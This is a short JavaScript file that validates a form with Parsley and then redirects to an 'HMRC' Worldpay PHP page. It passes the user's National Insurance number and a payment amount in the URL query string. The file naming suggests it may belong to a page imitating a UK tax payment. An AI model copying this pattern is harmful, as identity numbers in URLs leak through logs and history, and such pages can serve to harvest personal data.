$(document).ready(function() {
  var errorMessage;
  $('form').parsley({
      trigger: 'change',
      successClass: "success",
      errorClass: "error",
      classHandler: function (el) {
          return el.$element.closest('.form-group');
      },
      errorsContainer: function (el) {
          return el.$element.closest('.form-group');
      },
      errorTemplate: '<span class="error-message" aria-hidden="true"></span>',
  });
});

function completeAndRedirect(){
  location.href = "./Worldpay_HMRC_P1_OLD.php?refID="+document.getElementById('ni-number').value+"&Amount="+document.getElementById('amount-number').value;
}
